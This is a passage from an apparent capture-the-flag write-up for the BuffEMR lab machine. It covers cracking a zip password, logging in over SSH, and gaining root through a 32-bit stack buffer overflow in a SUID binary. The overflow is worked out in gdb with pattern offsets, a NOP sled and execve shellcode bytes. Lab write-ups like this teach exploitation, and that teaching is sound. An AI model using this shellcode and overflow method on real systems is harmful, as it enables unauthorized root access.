/srv/ftp/share/openemr/vendor/rospdf/pdf-php/readme.pdf
/srv/ftp/share/openemr/gacl/docs/manual.pdf
/srv/ftp/share/openemr/gacl/docs/translations/russian/manual_rus.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-1-0 Updating client profile Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-4-0 Updating clinic issues data Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-4-0 Managing Inventory _Products_ Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-5-0 Updating clinic checks data Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-5-2 Laboratory Orders and Results Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-0-0 Summary Guide of Administrative Processes Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 3-1-0 Define Provider  Appt Schedules Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 5-3-0 Generating aggregated reports in eIMS Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 5-1-0 Generating an export file in OpenEMR Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-1-1 Creating a non-duplicate new OpenEMR record Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-6-0 Completing Checkout - Closing visit cycle Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 9-0-0 Pentaho - XML Implementation Ver 4-1.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-0-0 Summary Guide of Visit Cycle Processes Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-2-1 Advanced search for an existing OpenEMR record Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 5-2-0 Importing an OpenEMR file into eIMS Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 6-5-0 Layouts Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-7-0 EOD Procedures Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-3-0 Managing Services Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 6-1-0 Global Settings Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 3-3-0 Completing Client Appointments Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-3-0 Updating clinic form data Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-3-0 Creating a new visit Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-0-0 Summary Guide of Updating Processes Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-2-0 Finding an existing OpenEMR records Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-4-2 Enhanced Inventory Lot Features Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-1-0 Managing Pre-Payments Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-5-0 Completing an e-Tally Sheet Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-1-0 Creating a new OpenEMR record Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-5-1 Laboratory Catalogue Configuration Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 5-0-0 Summary Guide of Integration with External Systems Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 3-2-0 Create new appointment Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 2-2-0 Updating clinic history data Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-2-0 Managing Referrals Ver 4-1.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 1-4-0 Printing a Paper Tally Sheet Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 6-0-0 Summary Guide of Customization Functions Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process Guidelines Outline -June 2010.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-4-1 Creating a Service Package Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 9-1-0 Pentaho basic concepts - tools - definitions Ver 4-1.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 4-5-0 Diagnostic Laboratories & Orders Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/IPPF_Guides/Process 3-0-0 Summary Guide of Managing Appointments Ver 4-0.pdf
/srv/ftp/share/openemr/Documentation/Payment_Posting_ZHH.pdf
/srv/ftp/share/openemr/Documentation/Using The End of Day Report in OpenEmr.pdf
/srv/ftp/share/openemr/Documentation/Clinical_Decision_Rules_Manual.pdf
/srv/ftp/share/openemr/Documentation/Complete_Vaccine_Listing.pdf
/srv/ftp/share/openemr/Documentation/Setting up the Patient flow board for OpenEmr.pdf
/usr/share/doc/printer-driver-foo2zjs/manual.pdf
/usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf
/usr/share/doc/qpdf/qpdf-manual.pdf
/usr/share/cups/data/default-testpage.pdf
/usr/share/cups/data/default.pdf
/usr/share/cups/data/standard.pdf
/usr/share/cups/data/topsecret.pdf
/usr/share/cups/data/unclassified.pdf
/usr/share/cups/data/secret.pdf
/usr/share/cups/data/form_english.pdf
/usr/share/cups/data/form_russian.pdf
/usr/share/cups/data/classified.pdf
/usr/share/cups/data/confidential.pdf
/usr/lib/libreoffice/share/xpdfimport/xpdfimport_err.pdf
www-data@buffemr:/var$ 
```

We can see a bunch of `PDFs`, and we can see some one of them with interesting names, but this is just a rabbit hole hahahhahhaha!

We can enumerate **more** the system directories, and in the `/var` path, we'll see an interesting file:

![](/assets/img/buffemr/10.png)

Ok, let's think a little bit. We have an encoded string that seems a **password** and we can de-encode. To unzip this file its asking for a password. So first, we are going to decode this base64 string:

```zsh
❯ echo "c2FuM25jcnlwdDNkCg==" | base64 -d
san3ncrypt3d
```

Now, we could use this password to unzip the file, but when we try that, it will fail because the password is incorrect:

![](/assets/img/buffemr/11.png)

Damnit! That didn't work... We could try with the tool `zip2john` so we'll obtain the zip's hash and then we could try to crack it:

```zsh
❯ zip2john user.zip > user
ver 2.0 efh 5455 efh 7875 user.zip/user.lst PKZIP Encr: TS_chk, cmplen=127, decmplen=146, crc=75CA180A ts=7169 cs=7169 type=8

❯ john -w:/usr/share/wordlists/rockyou.txt user
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2023-06-02 22:40) 0g/s 8537Kp/s 8537Kc/s 8537KC/s "2parrow"..*7¡Vamos!
Session completed. 
``` 
But this doesn't work either. After a few minutes, suddenly my brain thought: **"What if we don't need to decode the base64 string?"**. Let's try that:

```zsh
❯ unzip user.zip
Archive:  user.zip
[user.zip] user.lst password: 
  inflating: user.lst
```

Perfect XD
We can see the content of the resulting file and notice that contians a password:

![](/assets/img/buffemr/12.png)

This file says that we can only `SSH` to it, so let's follow its instructions:

```zsh
❯ ssh buffemr@192.168.0.112
The authenticity of host '192.168.0.112 (192.168.0.112)' can't be established.
ED25519 key fingerprint is SHA256:iDfhRLBM9zHfhxy00x35NITvqWsh8n69t73luoP/ESE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.112' (ED25519) to the list of known hosts.
buffemr@192.168.0.112's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-150-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

100 packages can be updated.
1 update is a security update.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Jun 24 10:01:00 2021 from 10.0.0.154
buffemr@buffemr:~$ whoami
buffemr
buffemr@buffemr:~$ export TERM=xterm-256color
buffemr@buffemr:~$ export SHELL=/bin/bash
buffemr@buffemr:~$ bash
buffemr@buffemr:~$ cat user_flag.txt
    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 
  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 
 ,'.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 
/ /|_|_|\ \| .-'/ (   ||\\||      / (   ||\\//||  |(_))                                                                
| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 
'. `---' .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 
  `-...-'   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                
 wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     
 (O)  (O) /  _)-<  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-<  (O)_/||_   
 / )  ( \ \__ `.   / __)|^_\      ,'.--.) ,'.---.`, | \  / |  | (_))|^_\  ,'.---.`, | \  / |  (..) \__ `.   / __)/o_)  
/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-' |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  
| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) 
'. `--' .`,-'   | \ \_  )|\\     '.    ) '. `---' .`||    ||   \)   )|\\ '. `---' .`||    || (_/\_),-'   | \ \_ | |//  
  `-..-' (_..--'   \__)(/  \)      `-.'    `-...-' (_/    \_)  (   (/  \)  `-...-' (_/    \_)     (_..--'   \__)\__/   



COnGRATS !! lETs get ROOT now ....!!
buffemr@buffemr:~$ 
```

NICEEEEE!!!!!

## Privilege escalation - Buffer Overflow

- - - 

In every privilege escalation we should list our privileges and `SUID` binaries, such as groups:

```zsh
buffemr@buffemr:~$ sudo -l
[sudo] password for buffemr: 
Sorry, user buffemr may not run sudo on buffemr.
buffemr@buffemr:~$ id
uid=1000(buffemr) gid=1000(buffemr) groups=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)
buffemr@buffemr:~$ 
```

Ok, we can see that we belong to `adm` group, but after testing this i've noticed that is a rabbit hole :').
Let's see some more things, like `SUID` binaries:

![](/assets/img/buffemr/13.png)

### How a Buffer Overflow (32bit) works?

- - - 

Ok, so we can see a binary called `dontexecute`, so this is very realistic (**SARCASSSSMM XD**)
Thanks to the name of the machine and the name of the file, we can deduce that we have to perform a [Buffer Overflow](https://www.imperva.com/learn/application-security/buffer-overflow/) attack, also known as `BoF`.


This is going to a pretty simple `Buffer Overflow` because is a 32bit binary:

![](/assets/img/buffemr/14.png)

Well, the file is named `dontexecute`, but we like breaking the rules right? Let's execute it!

```zsh
buffemr@buffemr:/opt$ ./dontexecute; echo
Usage: ./dontexecute argument
buffemr@buffemr:/opt$ 
```

Ok, so its asking for an argument. What happens with this? Well, maybe the developer of this program when he/she developed it, setted a limit value of bytes to that argument (ex. 10B), this is the size of the **buffer**. If this is not well implemented, the author is trusting on the user's input. If this is not well implemented, if we put a lot of bytes, the program should get a `segmentation fault`:

![](/assets/img/buffemr/15.png)

This can prove us that the coder of this program has established a buffer limit quite little. We don't know the limit of the buffer size, but we know it crashes.

If you input a number of `A` that is on the program's margin, there souldn't be any problem:

![](/assets/img/buffemr/17.png)

In the above image we can see that there are other registers such as `EBP` or `RET`. But the magic comes when you input a large number of `A`:

![](/assets/img/buffemr/18.png)

Here we can see that the `A` are overwriting the other registers of memory assigned to the program.

### PoC

- - - 

First, we are going to download the binary to our attacker machine so we can work more efficiently:

![](/assets/img/buffemr/19.png)

After that we are going to give executable permissions to the program:

```zsh
❯ chmod +x dontexecute
```

After that we need to install `GEF`:

```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Now with `GEF` installed, let's run `gdb` in quiet mode so it doesn't shows the ugly output:

![](/assets/img/buffemr/20.png)

```zsh
gef➤  r
Starting program: /home/ruy/Escritorio/Vulnhub/Machines/BuffEMR/content/dontexecute 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Usage: ./dontexecute argument[Inferior 1 (process 725420) exited with code 01]
gef➤ 
```

With `r` we are running the program. We can see that is running normally, its asking us for an argument:

```zsh
gef➤  r AAAAAA
Starting program: /home/ruy/Escritorio/Vulnhub/Machines/BuffEMR/content/dontexecute AAAAAA
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 726863) exited normally]
gef➤  
```

Ok, didn't crash, **yet**.
We want to see the registers, so let's crash it.
If you successfully crash the program, you should see something like this:

![](/assets/img/buffemr/21.png)

Ououou, what are we seeing here!? Remember in the `Buffer Overflow` explanation I was talking about overwriting the registers? Well, we've talked about `EBP`, remember? Hehe, we've been able to overwrite the `EBP` register!

![](/assets/img/buffemr/22.png)

If you notice, we've been also able to overwrite `EIP`, which is a register that holds the memory address of the next instruction to be executed by the processor.
Because we've been modified `EIP`, the program crashes because it don't find the direction given:

![](/assets/img/buffemr/23.png)

So what's the idea? Well, we want to find **how many `A`** we need to input so we can **fully control the `EIP`**. 
We can perform this with `pattern create`, which creates a random pattern of the characters we need to input to control the `EIP`:

![](/assets/img/buffemr/24.png)

If we run now the program with this pattern, we will notice a change on the `EIP`:

![](/assets/img/buffemr/25.png)

Great, we can notice that `EIP` is now `daaf`. 
To know **how many characters** we need to input until we reach `EIP`, we can use some simple regex to see where is `daaf` located in the random pattern:

![](/assets/img/buffemr/26.png)

Because I am a lazy guy, I don't want to calculate myself all the characters, so I am just going to do it with `patterm offset $eip`:

![](/assets/img/buffemr/27.png)

Okay, so it looks that we need 512 characters to reach the `EIP` register.

> **Note:** `AAAA` in hexadecimal is `41414141`, meanwhile `BBBB` is `42424242`

If we are truly overwriting the `EIP`, we should see `42424242` 
To test this, we can run the program but we are going to take advantage of `python` so we can print 512 characters:

![](/assets/img/buffemr/28.png)


Aaaaand great!!!! We are being able to overwrite the `EIP` register!!

![](/assets/img/buffemr/29.png)

Ok, we are able to do this, but in this memory direction (0x42424242) there isn't anything, so the idea is to point to a memory direction in which you are able to execute some things. 
The first thing we need to do is to check the protections of the program:

![](/assets/img/buffemr/30.png)

Here we can see that `NX` (Non-Executable) is disabled, so this allows us to execute a `shellcode` that we'll load into the allowed sections of the memory. But what happens? This will be interpreted as a string, not as a command, so because we have control of the `EIP`, we can call the memory direction of the allowed memory sections in which we'll load our `shellcode`. 

Ok, so we know that with this string we can control the `EIP`:

```zsh
 r $(python3 -c 'print("A"*512 + "B"*4)')
```

But, instead of putting 512 `A`, I am going to put `\x90` -> `NOP` (Not Operation Code), so when the program goes into the first memory section allowed (stack) is not going to execute anything, because is a NOP. But, in the above memory sections, there is where we'll load our `shellcode`. What this will do is: when we indicate the memory section on the `EIP`, it will find a `NOP`, so it automatically will go into the first memory section which contains any instruction (our `shellcode`).

Instead of using `msfvenom`, we are going to search for some [shellcodes](https://shell-storm.org/shellcode/files/shellcode-606.html) that execute `bash -p` command so we'll get a bash as root.
To perform this more easily, we are going to use the `gdb` installed on the victim machine:

![](/assets/img/buffemr/31.png)

Ok so this is same old.
Now, we don't want to multiply `A` by 512, because we need 33bytes for our `shellcode` before we overwrite the `EIP`; a little of math here guys.... ok its 479bytes remaining.

Now our `BoF` sentence will change a little bit:

```zsh
r $(python -c  'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4')
```

But this is not going to be interpreted as a command, its going to be interpreted as a string, because we are not changing the `EIP` to the beginning of the `NOP`:

![](/assets/img/buffemr/32.png)

As we can see here, `EIP` still `42424242`. 
Now, by executing `x/300wx $esp`, we can see the stack:

![](/assets/img/buffemr/33.png)

In red you can see the `NOPs` and in green you can see more or less where our `shellcode` would begin. 
Now, we could point to some near memory direction to our `shellcode` to indicate it in our `EIP`, for example this:

![](/assets/img/buffemr/34.png)

The direction is going to be this one `0xffffd720`, but because this is a x86 architecture, we need to "flip" the string. It would like something like this: `\x20\xd7\xff\xff`

![](/assets/img/buffemr/35.png)

All right!! So we can see that here is executing a `/bin/bash`, but this is being executed on `gdb`, but we don't want that, we want to execute it **out** of the `gdb`, we want to execute it on the machine. This is very simple, we will just need to pass the whole string to the program:

![](/assets/img/buffemr/36.png)

Perfect!!!!!
Now we could see root's flag :D

![](/assets/img/buffemr/37.png)
